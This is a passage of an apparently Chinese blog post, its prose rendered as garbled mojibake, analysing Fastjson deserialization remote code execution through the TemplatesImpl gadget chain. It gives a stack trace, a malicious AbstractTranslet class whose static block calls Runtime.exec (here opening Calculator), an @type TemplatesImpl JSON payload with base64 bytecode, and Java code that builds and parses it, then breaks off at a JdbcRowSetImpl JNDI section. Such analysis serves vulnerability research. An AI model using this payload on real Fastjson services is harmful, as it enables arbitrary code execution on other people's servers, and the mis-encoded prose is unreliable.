<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>exec:348, Runtime (java.lang)
</span></span><span style="display:flex;"><span>&lt;clinit&gt;:22, Calculartor (com.reus09)
</span></span><span style="display:flex;"><span>newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:423, Constructor (java.lang.reflect)
</span></span><span style="display:flex;"><span>newInstance:442, Class (java.lang)
</span></span><span style="display:flex;"><span>getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
</span></span><span style="display:flex;"><span>newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
</span></span><span style="display:flex;"><span>getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
</span></span><span style="display:flex;"><span>invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:62, NativeMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:498, Method (java.lang.reflect)
</span></span><span style="display:flex;"><span>setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:137, JSON (com.alibaba.fastjson)
</span></span><span style="display:flex;"><span>parse:193, JSON (com.alibaba.fastjson)
</span></span><span style="display:flex;"><span>main:117, FastJsonTest (com.reus09)
</span></span></code></pre></td></tr></table>
</div>
</div><p>é¦–å…ˆæˆ‘ä»¬åœ¨<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</code>å­˜åœ¨ä¸€ä¸ªæˆå‘˜å±æ€§ <code>_class</code>ï¼Œæ˜¯ä¸€ä¸ª Class ç±»å‹çš„æ•°ç»„ï¼Œæ•°ç»„é‡Œä¸‹æ ‡ä¸º<code>_transletIndex</code> çš„ç±»ä¼šåœ¨ <code>getTransletInstance()</code> æ–¹æ³•ä¸­ä½¿ç”¨ <code>newInstance()</code> å®ä¾‹åŒ–ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012163033006.png" alt="image-20221012163033006"  />
</p>
<p>åŒæ—¶æˆ‘ä»¬å‘ç°<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer</code>ä¸­è°ƒç”¨äº†<code>getTransletInstance()</code></p>
<p>æ–¹æ³•,åŒæ—¶,<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code>è°ƒç”¨äº†è¿™é‡Œçš„<code>newTransformer()</code>æ–¹æ³•ã€‚<img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012163356927.png" alt="image-20221012163356927"  />
</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012163504021.png" alt="image-20221012163504021"  />
</p>
<p>è¿™é‡Œçš„<code>getOutputProperties()</code>æ–¹æ³•å°±æ˜¯å¯¹<code>TemplatesImpl</code>ç±»çš„ç§æœ‰å…ƒç´ <code>outputProperties</code>çš„<code>getter</code>æ–¹æ³•</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012163737803.png" alt="image-20221012163737803"  />
</p>
<p>é‚£ä¹ˆæˆ‘ä»¬åªè¦æ§åˆ¶<code>_class</code>ä»¥åŠ<code>_transletIndex</code>å°±å¯ä»¥å®ç°ä»»æ„ç±»çš„å®ä¾‹åŒ–ï¼Œä»è€Œè§¦å‘æ¼æ´ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012164030137.png" alt="image-20221012164030137"  />
</p>
<p><code>defineTransletClasses()</code>ä¸<code>newInstance()</code>åœ¨åŒä¸€æ–¹æ³•å†…ï¼Œäºæ˜¯æŸ¥çœ‹ä¸€ä¸‹<code>defineTransletClasses()</code> çš„é€»è¾‘ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012164449592.png" alt="image-20221012164449592"  />
</p>
<p>å…ˆè¦æ±‚ <code>_bytecodes</code> ä¸ä¸ºç©ºï¼Œæ¥ç€å°±ä¼šè°ƒç”¨è‡ªå®šä¹‰çš„ ClassLoader å»åŠ è½½ <code>_bytecodes</code> ä¸­çš„ <code>byte[]</code> ã€‚è€Œ <code>_bytecodes</code> ä¹Ÿæ˜¯è¯¥ç±»çš„æˆå‘˜å±æ€§ã€‚</p>
<p><code>_bytecodes</code>å˜é‡éç©ºå€¼æ—¶ï¼Œç¨‹åºå°†ä¼šæŠŠ<code>_bytecodes</code>æ•°ç»„ä¸­çš„å€¼å¾ªç¯å–å‡ºï¼Œä½¿ç”¨<code>loader.defineClass</code>æ–¹æ³•ä»å­—èŠ‚ç è½¬åŒ–ä¸º<code>Class</code>å¯¹è±¡ï¼Œéšååèµ‹å€¼ç»™<code>_class[i]</code>ã€‚</p>
<p>è€Œå¦‚æœè¿™ä¸ªç±»çš„çˆ¶ç±»ä¸º <code>ABSTRACT_TRANSLET</code> ä¹Ÿå°±æ˜¯<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>ï¼Œå°±ä¼šå°†ç±»æˆå‘˜å±æ€§çš„ï¼Œ<code>_transletIndex</code> è®¾ç½®ä¸ºå½“å‰å¾ªç¯ä¸­çš„æ ‡è®°ä½ï¼Œè€Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œå°±æ˜¯<code>_class[0]</code>ã€‚å¦‚æœçˆ¶ç±»ä¸æ˜¯è¿™ä¸ªç±»ï¼Œå°†ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p>
<p>é‚£è¿™æ ·ä¸€æ¡å®Œæ•´çš„æ¼æ´è°ƒç”¨é“¾å°±å‘ˆç°å‡ºæ¥äº†ï¼š</p>
<ul>
<li>æ„é€ ä¸€ä¸ª TemplatesImpl ç±»çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ <code>_bytecodes</code> æ˜¯æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»çš„ç±»å­—èŠ‚ç ï¼Œè¿™ä¸ªç±»çš„çˆ¶ç±»æ˜¯ AbstractTransletï¼Œæœ€ç»ˆè¿™ä¸ªç±»ä¼šè¢«åŠ è½½å¹¶ä½¿ç”¨ <code>newInstance()</code> å®ä¾‹åŒ–ã€‚</li>
<li>åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œç”±äºgetteræ–¹æ³• <code>getOutputProperties()</code>ï¼Œæ»¡è¶³æ¡ä»¶ï¼Œå°†ä¼šè¢« fastjson è°ƒç”¨ï¼Œè€Œè¿™ä¸ªæ–¹æ³•è§¦å‘äº†æ•´ä¸ªæ¼æ´åˆ©ç”¨æµç¨‹ï¼š<code>getOutputProperties()</code> -&gt; <code>newTransformer()</code> -&gt; <code>getTransletInstance()</code> -&gt; <code>defineTransletClasses()</code> / <code>EvilClass.newInstance()</code>.</li>
</ul>
<p>åŒæ—¶ä¸ºäº†ç¨‹åºåœ¨å®ä¾‹åŒ–ä¹‹å‰å› æŠ¥é”™é€€å‡ºï¼Œéœ€è¦å°†<code>_name</code>å’Œ<code>_tfactory</code>è®¾ç½®ä¸ä¸ºç©ºï¼Œ<code>_tfactory</code>å¦‚æœä¸æŒ‡å®šä¼šå‡ºç°ç©ºæŒ‡é’ˆã€‚æŸ¥çœ‹_tfactoryçš„å®šä¹‰å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">transient</span> TransformerFactoryImpl _tfactory = <span style="color:#fff;font-weight:bold">null</span>;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012165031307.png" alt=""  />
</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012165045973.png" alt="image-20221012165045973"  />
å…·ä½“å®ç°ï¼š</p>
<p>ä¸€ä¸ªç»§æ‰¿äº†<code>AbstractTranslet</code>çš„æ¶æ„ç±»,å°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç ã€‚</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName Calculartor
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2022/10/12 15:42
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> Calculartor <span style="color:#fff;font-weight:bold">extends</span> AbstractTranslet {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">static</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>            Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(<span style="color:#0ff;font-weight:bold">&#34;open /System/Applications/Calculator.app&#34;</span>);
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span> (IOException e) {
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> transform(DOM document, SerializationHandler[] handlers) <span style="color:#fff;font-weight:bold">throws</span> TransletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style="color:#fff;font-weight:bold">throws</span> TransletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>payload</code>éƒ¨åˆ†ï¼š</p>
<ul>
<li>
<p><code>JSON</code>å¯¹åº”çš„å¦‚ä¸‹:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_bytecodes&#34;</span>: [<span style="color:#0ff;font-weight:bold">&#34;yv66vgAAADQA...CJAAk=&#34;</span>],
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_tfactory&#34;</span>: {},
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_outputProperties&#34;</span>: {},
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>ä»£ç å¦‚ä¸‹:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">byte</span>[] code = Files.<span style="color:#007f7f">readAllBytes</span>(Paths.<span style="color:#007f7f">get</span>(<span style="color:#0ff;font-weight:bold">&#34;/Users/reus09/Desktop/rce/FastJson/target/classes/com/reus09/Calculartor.class&#34;</span>));
</span></span><span style="display:flex;"><span>String codeString = Base64.<span style="color:#007f7f">getEncoder</span>().<span style="color:#007f7f">encodeToString</span>(code);
</span></span><span style="display:flex;"><span>String payload = <span style="color:#0ff;font-weight:bold">&#34;{\&#34;@type\&#34;:\&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&#34;,\&#34;_bytecodes\&#34;:[\&#34;&#34;</span>+Base64.<span style="color:#007f7f">getEncoder</span>().<span style="color:#007f7f">encodeToString</span>(code)+<span style="color:#0ff;font-weight:bold">&#34;\&#34;],\&#34;_name\&#34;:\&#34;reus09\&#34;,\&#34;_tfactory\&#34;:{ },\&#34;_outputProperties\&#34;:{ },\&#34;_version\&#34;:\&#34;1.0\&#34;,\&#34;allowedProtocols\&#34;:\&#34;all\&#34;}&#34;</span>;
</span></span><span style="display:flex;"><span>JSON.<span style="color:#007f7f">parse</span>(payload, Feature.<span style="color:#007f7f">SupportNonPublicField</span>);
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012165442664.png" alt="image-20221012165442664"  />
</p>
</li>
</ul>
<h3 id="jdbcrowsetimpl--ååºåˆ—åŒ–"><code>JdbcRowSetImpl </code> ååºåˆ—åŒ–<a hidden class="anchor" aria-hidden="true" href="#jdbcrowsetimpl--ååºåˆ—åŒ–">#</a></h3>
<p><code>JdbcRowSetImpl </code>ç±»ä½äº <code>com.sun.rowset.JdbcRowSetImpl</code> ï¼Œæ˜¯ <code>javax.naming.InitialContext#lookup()</code> å‚æ•°å¯æ§å¯¼è‡´çš„ JNDI æ³¨å…¥ã€‚</p>
<p><code>JdbcRowSetImpl</code>è°ƒç”¨å‡½æ•°æ ˆ</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
